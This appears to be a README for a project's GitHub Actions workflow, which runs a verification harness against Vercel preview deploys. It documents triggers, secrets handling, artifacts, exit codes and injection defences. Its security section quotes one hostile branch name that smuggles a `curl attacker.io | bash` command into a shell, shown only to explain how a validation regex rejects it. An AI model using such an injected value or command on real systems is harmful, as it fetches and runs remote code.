# GitHub Actions

Workflows that run automatically in CI for the nightwork-platform repo.

## Posture

This is the **first GitHub Actions workflow on `main`** from the `phase/1.5-c-verification-harness` branch (per `.planning/phases/stage-1.5c-verification-harness/01.5-c-verification-harness-CONTEXT.md` D-29 + the `<code_context>` note: `.github/workflows/` did not exist on `main` as of HEAD `7607bbf`).

The verify-phase workflow is the CI signal that Plan 8b's `runLoop` will eventually consume — pushing a commit to a `phase/*` branch triggers the harness against the matching Vercel preview deploy and posts the result as both a PR comment and a commit status.

Per CLAUDE.md + D-29: secrets only, never committed. The five environment variables wired through `${{ secrets.* }}` (`ANTHROPIC_API_KEY`, `VERCEL_TOKEN`, `HARNESS_FIXTURE_PASSWORD`, `NEXT_PUBLIC_SUPABASE_URL`, `NEXT_PUBLIC_SUPABASE_ANON_KEY`) are validated to be present in the GitHub Actions secrets store via `gh api repos/jakeross838/nightwork-platform/actions/secrets` (see `.planning/expansions/stage-1.5c-verification-harness-SETUP-COMPLETE.md`).

## verify-phase.yml

Runs the 3-layer verification harness (Layer 1 mechanical → Layer 2 standards → Layer 3 vision) against Vercel preview URLs. The full pipeline contract lives at `.planning/architecture/VERIFICATION-PIPELINE.md` (shipped by Plan 10 of this phase).

### Triggers

| Trigger | When | Notes |
|---|---|---|
| `push` | Every push to `phase/<sub-stage>-<name>` | Auto-discovers the matching Vercel preview URL via Vercel REST API (Plan 5 hierarchy: REST → CLI → deterministic) |
| `workflow_dispatch` | Manual via Actions tab or `gh workflow run` | Required `phase` input; optional `preview_url` input (skips the wait-for-Ready step if provided) |

### Required secrets

| Secret | Purpose | How to set |
|---|---|---|
| `ANTHROPIC_API_KEY` | Layer 3 vision API calls (`@anthropic-ai/sdk`) | `gh secret set ANTHROPIC_API_KEY` |
| `VERCEL_TOKEN` | Vercel REST API for preview-URL discovery + `wait-for-Ready` poll | `gh secret set VERCEL_TOKEN` |
| `HARNESS_FIXTURE_PASSWORD` | Sign in as `harness-fixture@nightwork.local` per `auth-strategy.ts` | `gh secret set HARNESS_FIXTURE_PASSWORD` |
| `NEXT_PUBLIC_SUPABASE_URL` | Supabase client init for the harness session | `gh secret set NEXT_PUBLIC_SUPABASE_URL` |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Supabase anon key for the harness session | `gh secret set NEXT_PUBLIC_SUPABASE_ANON_KEY` |
| `GITHUB_TOKEN` | PR comment + commit status (auto-provided by GitHub Actions) | _automatic_ |

Per CLAUDE.md + D-29: secrets only, never committed. Per D-30: no `SUPABASE_SERVICE_ROLE_KEY` and no platform-admin path — the harness operates on the fixture-org-scoped session only.

### Outputs

- **PR comment** — final markdown report posted to the PR for the branch (if a PR exists). Per iter-1 C5: `final.md` is sanitized by `report-writer.ts` (no page URLs, no screenshot paths, no raw vision reasoning). Safe for PR comment + workflow artifact. Per Jake watchpoint #5: the report itself surfaces actionable info per nwrp48 PART 8 (criterion ID, file:line, expected vs. actual, suggested-fix where the layer supports it).
- **Commit status** — `verify-phase` context with state `success` / `failure` / `error`. Visible on commit + PR.
- **Workflow artifact** — `verify-phase-<sha>` containing:
  - `harness-output.json` — raw stdout from `scripts/verify-phase.ts` (the JSON line `{kind: "harness-report", report}` consumed by Plan 9 calibration-log custodian sweep)
  - `.planning/verification/reports/` — all sanitized git-tracked reports (per D-15)
  - `report.md` files under `.planning/verification/runs/<phase>/<commit>/` (per-commit detail; full evidence — gitignored on disk per D-16, included in artifact for CI traceability)
  - `HALT-*.md` files under `runs/` (halt-for-Jake artifacts when Layer 3 confidence < 0.7)
  - `idempotency.json` files under `runs/` (Plan 4 idempotency-cache state)

  Per iter-1 C2: retention is **7 days** (was 30 — Anthropic-as-data-processor posture + tenant data minimization). HALT artifacts have a separate sanitized copy at `reports/<phase>/halts/<commit>.md` (git-tracked; SOC2 traceability per W3 enterprise-readiness review).

  **Excluded from the artifact:** raw screenshot bytes (`runs/**/screenshots/**`). Screenshots stay only in gitignored `runs/` on the runner per D-30 — once C1 ships authenticated harness sessions, route renders may carry tenant-bearing UI and must not surface in artifacts that any repo-Read user can `gh run download`.

### Exit-code mapping

`scripts/verify-phase.ts` exit codes (Plan 5) → commit status state:

| Exit | Meaning | Commit status | Description |
|---|---|---|---|
| 0 | All 3 layers passed (no FAIL verdicts, no confidence < 0.7) | `success` | All 3 layers passed |
| 1 | failed-fixable (any FAIL verdict with confidence ≥ 0.7) | `failure` | Harness failed (failed-fixable) |
| 2 | failed-ambiguous (any confidence < 0.7 — halt-for-Jake per D-07) | `failure` | Halt-for-Jake (failed-ambiguous: iter-3 OR confidence < 0.7) |
| 3 | Vercel preview URL discovery failed | `error` | Vercel preview URL discovery failed |
| 4+ | Harness runtime error (uncaught exception, missing env, etc.) | `error` | Harness runtime error (exit N) |

### Concurrency

```yaml
concurrency:
  group: verify-phase-${{ github.ref }}
  cancel-in-progress: true
```

One harness run per branch at a time. New pushes to the same branch cancel any in-progress runs to avoid two harness runs racing on a single phase. The cancellation is graceful (workflow respects SIGTERM) per CLAUDE.md "Never kill running processes" rule — no `kill -9` anywhere in this workflow.

### Wait for Vercel preview to be Ready

Before invoking the harness, the workflow polls Vercel's REST API for the preview deployment matching `github.sha`:

```
GET https://api.vercel.com/v6/deployments?meta-githubCommitSha=<SHA>
Authorization: Bearer $VERCEL_TOKEN
```

It waits up to ~5 minutes (delays: 10s, 20s, 40s, 60s, 60s, 60s, 60s) for `state === "READY"`. If `state` becomes `ERROR` or `CANCELED`, the workflow exits with code 3. If the timeout elapses, the workflow also exits with code 3.

When `workflow_dispatch` is triggered with `preview_url` provided, this step is skipped (operator already knows the URL is ready).

### Manual run

```bash
# Run on this branch's preview (auto-discovered)
gh workflow run verify-phase.yml --ref phase/1.5-c-verification-harness \
  -f phase=stage-1.5c-verification-harness

# Run with explicit preview URL (skips Vercel wait)
gh workflow run verify-phase.yml --ref phase/1.5-c-verification-harness \
  -f phase=stage-1.5c-verification-harness \
  -f preview_url=https://nightwork-platform-git-...vercel.app
```

After triggering manually, watch the run with `gh run watch` or `gh run view --log`. The exit-code → commit-status mapping above applies the same way as for `push` events.

### First-run validation (the meta-test)

Per Jake watchpoint #8 (nwrp53): the first push to `phase/1.5-c-verification-harness` that lands `verify-phase.yml` itself will trigger this workflow against the same commit that introduced it. The harness will then run against the Vercel preview built from that commit, walking the verification module's own routes. Since this phase's `PLAN.md` files contain ~141 non-N/A criteria (per Plan 5 manual verification), Layer 3 vision will exercise the criteria-loader on real plan content. **Plan 6 verifies Plan 6.**

To verify the secrets actually resolve at runtime (Jake watchpoint #7), trigger a manual run via `gh workflow run` after the first push lands; if all 3 secrets resolve, the wait-for-Ready step + the harness step + the PR-comment step all complete without `secret not found` errors.

### Security posture

#### SEC-HIGH-1 — env-var indirection (per iter-1 plan-review)

**ALL `${{ github.* }}` and `${{ inputs.* }}` expressions flow through `env:` blocks.** Shell `run:` bodies reference only environment variables (`$BRANCH`, `$PHASE`, `$SHA`, `$REPO`, `$RUN_ID`, `$EVENT_NAME`, `$INPUT_PHASE`, `$INPUT_PREVIEW_URL`). This prevents shell injection via branch names or input values containing metacharacters.

A branch named `phase/evil; curl attacker.io | bash; echo x` is rejected by the BRANCH validation regex `^phase/[a-z0-9.-]+$` before substitution. Similar regexes guard `INPUT_PHASE` and `INPUT_PREVIEW_URL`.

Verify with:

```bash
# Should return 0 violations (only env: / with: / if: / comments / concurrency: contexts)
grep -nE '\$\{\{ github\.' .github/workflows/verify-phase.yml \
  | grep -v 'env:\|with:\|if:\|^\s*#\|concurrency:'
```

#### SEC-HIGH-2 — vision API prompt injection

Layer 3 (Plan 4) ships criterion-text sanitization in `criteria-loader.ts` and a system-prompt hardening note in `vision-client.ts`. The workflow itself does not fetch criterion text; it invokes `scripts/verify-phase.ts` which delegates to Plan 4's loader. No additional sanitization in this workflow.

#### D-30 — tenant boundary

The workflow uses `HARNESS_FIXTURE_PASSWORD` only. There is no `SUPABASE_SERVICE_ROLE_KEY`, no `getCurrentMembership()` bypass, no platform-admin escape hatch. Per CONTEXT.md D-30: "if a future need arises, it requires explicit D-30 amendment, not a code workaround."

### Adding more workflows

Per Wave 3 of this phase (1.5c-verification-harness) + Foundation F3: this is the first GH Action on `main`. F3's narrowed-scope CI test gate work picks up `npm test` + typecheck integration; that workflow lands separately. Keep `verify-phase.yml` focused on the harness pipeline.

Other planned future workflows (NOT yet shipped):

- `drummond-grep-check.yml` — currently lives on `phase/1.5-c-information-architecture` (per `git show origin/phase/1.5-c-information-architecture:.github/workflows/drummond-grep-check.yml`); will land on `main` when 1.5c IA branch merges (per Q6=B retrofit sequence in `SETUP-COMPLETE.md`).
- `ci-test-gate.yml` — Foundation F3 narrowed scope (`npm test`, typecheck, lint).

Per D-29: this phase does NOT touch `.github/workflows/drummond-grep-check.yml` (lives on the IA branch). Future phases that retrofit it onto main will create a separate PR.
